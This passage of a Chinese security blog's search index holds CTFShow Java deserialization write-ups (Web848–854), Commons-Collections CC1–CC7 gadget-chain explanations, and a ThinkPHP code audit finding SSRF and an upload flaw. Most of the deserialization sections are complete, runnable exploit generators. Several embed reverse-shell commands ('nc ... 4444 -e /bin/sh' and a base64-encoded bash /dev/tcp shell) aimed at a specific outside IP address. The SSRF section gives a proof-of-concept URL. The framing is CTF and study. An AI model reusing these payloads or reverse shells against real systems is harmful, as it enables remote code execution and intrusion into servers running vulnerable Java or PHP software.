Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:2:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web848Java7 commons-collections 3.1 禁用了TransformedMap类 换CC1的另一条用LazyMap package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjE1LjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(o); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:3:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web849Java8 commons-collections4.0 用CC2链 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import javax.swing.text.AbstractDocument; import javax.xml.transform.Templates; import javax.xml.ws.spi.Invoker; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Base64; import java.util.PriorityQueue; public class CommonsCollections2 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",new Class[]{},new Object[]{}); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templatesImpl); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(\"transformer\"); transformerField.setAccessible(true); transformerField.set(transformingComparator,invokerTransformer); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(priorityQueue); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } Test.java import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { { try { Runtime.getRuntime().exec(\"nc 124.220.215.8 4444 -e /bin/sh\"); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:4:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web850Java7 commons-collections3.1 用CC3链打 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(o); String p = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(p); } } 注 这里的恶意类需要用jdk7版本编译,否则环境中无法识别到 https://y4tacker.github.io/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/ ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:5:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web851JDK8 commons-collections4.0 用CC6的链打，但是需要注意的是导入org.apache.commons.collections4 package org.example.CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import org.apache.commons.collections4.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CommonsCollections6 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"nc 124.220.215.8 4444 -e /bin/sh\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Outermap = LazyMap.lazyMap(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(Outermap, \"test\"); HashMap\u003cObject, Object\u003e map2 = new HashMap\u003c\u003e(); map2.put(tiedMapEntry,\"test1\"); Outermap.remove(\"test\"); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Outermap,chainedTransformer); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(map2); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } 需要做修改的是，在4.0版本decorate被lazymap代替了 ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:6:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web852JDK8 commons-collections4.0 继续用上面的poc打 ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:7:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web853用yuxx师傅的链子，基于CC7链修改了适用于CommonsCollections4.0的poc package org.example.CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.map.DefaultedMap; import java.io.*; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Constructor; import java.util.Base64; import java.io.ByteArrayOutputStream; public class CommonsCollections7 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"nc 124.220.215.8 4444 -e /bin/sh\"}) }; Transformer transformerChain2 = new ChainedTransformer(transformers); Map hashMap1 = new HashMap(); Map hashMap2 = new HashMap(); Class\u003cDefaultedMap\u003e d = DefaultedMap.class; Constructor\u003cDefaultedMap\u003e declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class); declaredConstructor.setAccessible(true); DefaultedMap defaultedMap1 = declaredConstructor.newInstance(hashMap1, transformerChain2); DefaultedMap defaultedMap2 = declaredConstructor.newInstance(hashMap2, transformerChain2); defaultedMap1.put(\"yy\", 1); defaultedMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(defaultedMap1, 1); hashtable.put(defaultedMap2, 1); defaultedMap2.remove(\"yy\"); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(hashtable); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:8:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web854JDK8 commons-collections4.0 过滤了一些东西 - TransformedMap - PriorityQueue - InstantiateTransformer - TransformingComparator - TemplatesImpl - AnnotationInvocationHandler - HashSet - Hashtable - LazyMap 构造一条新的链子 package org.example.CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import org.apache.commons.collections4.map.DefaultedMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Constructor; import java.util.Base64; import java.io.ByteArrayOutputStream; public class CommonsCollections7 { public static void main(String[] args) throws Exception{ Transformer transformerChain = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"nc 124.220.215.8 4444 -e /bin/sh\"}) }; Map innerMap1 = new HashMap(); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); Class\u003cDefaultedMap\u003e d = DefaultedMap.class; Constructor\u003cDefaultedMap\u003e declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class); declaredConstructor.setAccessible(true); DefaultedMap defaultedMap = declaredConstructor.newInstance(innerMap1, transformerChain); TiedMapEntry tiedMapEntry=new TiedMapEntry(defaultedMap, \"test\"); HashMap\u003cObject, Object\u003e hashMap=new HashMap\u003c\u003e(); hashMap.put(tiedMapEntry,\"test01\"); map.remove(\"test\"); Field iTransformers = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); iTransformers.setAccessible(true); iTransformers.set(transformerChain,transformers); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(hashMap); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(b.toByteArray())); // ois.readObject(); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:9:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web854链子分析可以看到上面的poc，仍然是调用到了InvokerTransformer类中的transform方法 来看一下调用栈 可以看到是调用了DefaultedMap类中的get方法，存在transform方法 也就是说将之前的LazyMap类中的get方法，换成了DefaultedMap类中的get方法 引用Evo1ution师傅总结的一张照片 ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:9:1","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" CommonsCollections2-4-5链详解Commons-Collections版本为4.0 ","date":"2024-01-17","objectID":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections2 4 5链详解","uri":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections4 链详解仍然是调用了transform方法，但入口点变了位置，这次利用了TransformingComparator类compare()方法中的transform方法 在PriorityQueue类中的readObject方法恰好调用了compare方法 跟进heapify() 跟进siftDown() 再跟进siftDownUsingComparator() 正好在这里调用了compare()方法 构造一下poc package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CommonsCollections4 { public static void main(String[] args) throws Exception { TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); Class priorityClass = priorityQueue.getClass(); Field sizeField = priorityClass.getDeclaredField(\"size\"); sizeField.setAccessible(true); sizeField.set(priorityQueue,2); //serialize(priorityQueue); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-17","objectID":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:1","tags":["CommonsCollections"],"title":"CommonsCollections2 4 5链详解","uri":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections2 链详解利用InvokerTransformer方法，来调用newTransformer()来加载恶意类的调用 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import javax.swing.text.AbstractDocument; import javax.xml.transform.Templates; import javax.xml.ws.spi.Invoker; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CommonsCollections2 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",new Class[]{},new Object[]{}); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templatesImpl); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(\"transformer\"); transformerField.setAccessible(true); transformerField.set(transformingComparator,invokerTransformer); // serialize(priorityQueue); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-17","objectID":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:2","tags":["CommonsCollections"],"title":"CommonsCollections2 4 5链详解","uri":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections5 链详解这里利用了TiedMapEntry类中的toString()方法 \u0008接着又去调用了getValue() 然后调用了任意类的get()方法，这里直接用LazyMap类中的get()方法即可 后面的直接用 CC1 部分链 这里的入口点readObject()需要选一个有toString()方法的，这里用BadAttributeValueExpException类中的readObject()方法 构造poc package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections4.map.TransformedMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections5 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,1); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1); Class c = Class.forName(\"javax.management.BadAttributeValueExpException\"); Field valField = c.getDeclaredField(\"val\"); valField.setAccessible(true); valField.set(badAttributeValueExpException,tiedMapEntry); //serialize(badAttributeValueExpException); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-17","objectID":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:3","tags":["CommonsCollections"],"title":"CommonsCollections2 4 5链详解","uri":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["PHP"],"content":"ThinkPHP5.0完全开发手册 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:0:0","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 某盘代码审计学习完开发手册，先来套源码试试手。 想要快速入手代码审计，就要先看手册了解一些底层架构等等 从index.php开始 和原来的相比改动不大，应用目录是application，直接进行查看 先看config.php，看一些配置信息能够帮助我们快速了解此套源码 全局过滤方法 访问模式，最最最重要的是我们的控制器 可以看到，它开启了路由但是并没有打开强制路由 这里看一下路由，并没有什么东西 想要得到未授权RCE，还是得先看Index模块下面的控制器，因为可能有未授权访问，像这种 MVC 架构admin模块下，未授权太少了Orz 除了Api、Login控制器，其他控制器均继承了Base控制器 那他们为什么要都继承Base呢？进入看一下 Orz在构造函数下面做了权限验证，扫了一眼除非知道数据库里的$header_uid不然无法绕过 但是，我们上面还提到了一个api控制器，没有继承。进入查看一下 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x01 SSRF在curlfun()函数下面，看到了一个很明显的SSRF public function curlfun($url, $params = array(), $method = 'GET') { $header = array(); $opts = array(CURLOPT_TIMEOUT =\u003e 10, CURLOPT_RETURNTRANSFER =\u003e 1, CURLOPT_SSL_VERIFYPEER =\u003e false, CURLOPT_SSL_VERIFYHOST =\u003e false, CURLOPT_HTTPHEADER =\u003e $header); /* 根据请求类型设置特定参数 */ switch (strtoupper($method)) { case 'GET' : $opts[CURLOPT_URL] = $url . '?' . http_build_query($params); $opts[CURLOPT_URL] = substr($opts[CURLOPT_URL],0,-1); break; case 'POST' : //判断是否传输文件 $params = http_build_query($params); $opts[CURLOPT_URL] = $url; $opts[CURLOPT_POST] = 1; $opts[CURLOPT_POSTFIELDS] = $params; break; default : } /* 初始化并执行curl请求 */ $ch = curl_init(); curl_setopt_array($ch, $opts); $data = curl_exec($ch); $error = curl_error($ch); curl_close($ch); if($error){ $data = null; } return $data; } 先本地起一个服务 构造一个poc试试， /index.php/index/api/curlfun?url=http://localhost:9080/ssrf.txt ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:1","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x02 SSRFapi控制器下，还存在一个post_url方法，也存在SSRF public function post_curl($url,$data){ $ch = curl_init($url); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"POST\"); curl_setopt($ch, CURLOPT_POSTFIELDS,$data); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $result = curl_exec($ch); if (curl_errno($ch)) { print curl_error($ch); } curl_close($ch); return $result; } ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:2","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x03 后台 RCE在admin模块setup控制器editconf方法处，存在文件上传漏洞 public function editconf() { // echo \"test\"; // if($this-\u003eotype != 3){ // echo '死你全家!';exit; // } 